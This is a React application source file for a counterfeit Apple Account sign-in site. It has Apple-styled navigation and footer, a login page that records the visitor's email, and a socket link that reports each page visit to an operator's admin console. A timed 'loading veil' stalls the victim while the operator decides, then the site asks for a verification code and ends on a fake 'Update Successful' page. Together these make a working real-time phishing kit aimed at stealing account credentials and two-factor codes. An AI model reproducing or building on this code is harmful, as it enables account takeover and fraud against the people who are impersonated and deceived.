import { useEffect } from "react";
import { navigate, usePath } from "./router";
import GlobalNav from "./components/GlobalNav";
import LocalNav from "./components/LocalNav";
import AppleFooter from "./components/AppleFooter";
import { LoadingVeil } from "./components/Spinner";
import Login from "./pages/Login";
import Verify from "./pages/Verify";
import Terms from "./pages/Terms";
import Done from "./pages/Done";
import Admin from "./admin/Admin";
import { announcePage, rememberEmail } from "./lib/socket";

const LOGIN_ROUTES = new Set(["/", "/sign-in", "/signin", "/sign_in", "/account"]);

const TITLES = {
  "/terms": "Terms and Conditions",
  "/done": "Update Successful",
  "/admin": "Admin console",
};

export default function App() {
  const path = usePath();

  useEffect(() => {
    window.scrollTo(0, 0);
    document.title = TITLES[path] || "Apple Account: Sign-in and Manage";
    if (path !== "/admin") announcePage(path);
  }, [path]);

  // The loading state is the sign-in page under Apple's veil (held while the
  // answer is decided), then the code step opens. Front-end only.
  useEffect(() => {
    if (path !== "/loading") return;
    const t = setTimeout(() => navigate("/verify"), 3500);
    return () => clearTimeout(t);
  }, [path]);

  if (path === "/admin") return <Admin />;

  const loading = path === "/loading";
  const login = loading || LOGIN_ROUTES.has(path);

  let page;
  if (login) {
    page = (
      <Login
        onContinue={(email) => {
          rememberEmail(email);
          navigate("/loading");
        }}
      />
    );
  } else if (path === "/verify") {
    page = <Verify onContinue={() => navigate("/terms")} />;
  } else if (path === "/terms") {
    page = <Terms onAgree={() => navigate("/done")} />;
  } else if (path === "/done") {
    page = <Done />;
  } else {
    page = (
      <Login
        onContinue={(email) => {
          rememberEmail(email);
          navigate("/loading");
        }}
      />
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <GlobalNav />
      <LocalNav />
      <main className="relative">{page}</main>
      <AppleFooter grayscaleText />
      {loading && <LoadingVeil />}
    </div>
  );
}
